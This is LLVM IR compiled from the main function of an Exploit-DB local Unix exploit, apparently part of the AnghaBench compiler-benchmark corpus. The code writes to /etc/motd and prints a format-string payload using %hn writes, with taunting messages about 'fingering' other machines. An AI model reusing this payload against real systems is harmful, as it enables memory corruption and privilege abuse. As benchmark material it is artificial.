; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/unix/local/extr_20963.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/unix/local/extr_20963.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@OVER = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [20 x i8] c"evil fingered from \00", align 1
@WITH = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [10 x i8] c"/etc/motd\00", align 1
@.str.2 = private unnamed_addr constant [3 x i8] c"w+\00", align 1
@.str.3 = private unnamed_addr constant [39 x i8] c"You must be root to use this exploit.\0A\00", align 1
@.str.4 = private unnamed_addr constant [9 x i8] c":::A%s%s\00", align 1
@.str.5 = private unnamed_addr constant [26 x i8] c"%%%ux%%%d$hn%%%ux%%%d$hn\0A\00", align 1
@stderr = common dso_local global i32* null, align 8
@.str.6 = private unnamed_addr constant [35 x i8] c"Visit http://mp3.com/cosv/ today!\0A\00", align 1
@.str.7 = private unnamed_addr constant [51 x i8] c"And mebe visit your account on the other machine.\0A\00", align 1
@.str.8 = private unnamed_addr constant [22 x i8] c"after you finger it.\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8**, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32*, align 8
  store i32 %0, i32* %3, align 4
  store i8** %1, i8*** %4, align 8
  store i32 0, i32* %5, align 4
  %15 = load i32, i32* @OVER, align 4
  store i32 %15, i32* %6, align 4
  store i32 0, i32* %7, align 4
  %16 = load i32, i32* @OVER, align 4
  %17 = add nsw i32 %16, 2
  store i32 %17, i32* %8, align 4
  %18 = call i32 @strlen(i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str, i64 0, i64 0))
  %19 = add nsw i32 %18, 9
  store i32 %19, i32* %9, align 4
  %20 = load i32, i32* @WITH, align 4
  store i32 %20, i32* %10, align 4
  store i32 20, i32* %11, align 4
  %21 = call i32* @fopen(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.1, i64 0, i64 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.2, i64 0, i64 0))
  store i32* %21, i32** %14, align 8
  %22 = load i32*, i32** %14, align 8
  %23 = icmp ne i32* %22, null
  br i1 %23, label %27, label %24

24:                                               ; preds = %2
  %25 = call i32 (i8*, ...) @fprintf(i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str.3, i64 0, i64 0))
  %26 = call i32 @exit(i32 1) #3
  unreachable

27:                                               ; preds = %2
  %28 = load i32, i32* %10, align 4
  %29 = and i32 %28, 65535
  %30 = load i32, i32* %9, align 4
  %31 = sub nsw i32 %29, %30
  store i32 %31, i32* %12, align 4
  %32 = load i32, i32* %10, align 4
  %33 = ashr i32 %32, 16
  %34 = add nsw i32 65536, %33
  %35 = load i32, i32* %12, align 4
  %36 = sub nsw i32 %34, %35
  %37 = load i32, i32* %9, align 4
  %38 = sub nsw i32 %36, %37
  %39 = and i32 %38, 65535
  store i32 %39, i32* %13, align 4
  %40 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.4, i64 0, i64 0), i32* %6, i32* %8)
  %41 = load i32, i32* %12, align 4
  %42 = load i32, i32* %11, align 4
  %43 = load i32, i32* %13, align 4
  %44 = load i32, i32* %11, align 4
  %45 = add nsw i32 %44, 1
  %46 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str.5, i64 0, i64 0), i32 %41, i32 %42, i32 %43, i32 %45)
  %47 = load i32*, i32** @stderr, align 8
  %48 = bitcast i32* %47 to i8*
  %49 = call i32 (i8*, ...) @fprintf(i8* %48, i8* getelementptr inbounds ([35 x i8], [35 x i8]* @.str.6, i64 0, i64 0))
  %50 = load i32*, i32** @stderr, align 8
  %51 = bitcast i32* %50 to i8*
  %52 = call i32 (i8*, ...) @fprintf(i8* %51, i8* getelementptr inbounds ([51 x i8], [51 x i8]* @.str.7, i64 0, i64 0))
  %53 = load i32*, i32** @stderr, align 8
  %54 = bitcast i32* %53 to i8*
  %55 = call i32 (i8*, ...) @fprintf(i8* %54, i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.8, i64 0, i64 0))
  %56 = load i32*, i32** %14, align 8
  %57 = bitcast i32* %56 to i8*
  %58 = call i32 (i8*, ...) @fprintf(i8* %57, i8* getelementptr inbounds ([35 x i8], [35 x i8]* @.str.6, i64 0, i64 0))
  %59 = load i32*, i32** %14, align 8
  %60 = call i32 @fclose(i32* %59)
  ret i32 0
}

declare dso_local i32 @strlen(i8*) #1

declare dso_local i32* @fopen(i8*, i8*) #1

declare dso_local i32 @fprintf(i8*, ...) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i32 @printf(i8*, ...) #1

declare dso_local i32 @fclose(i32*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
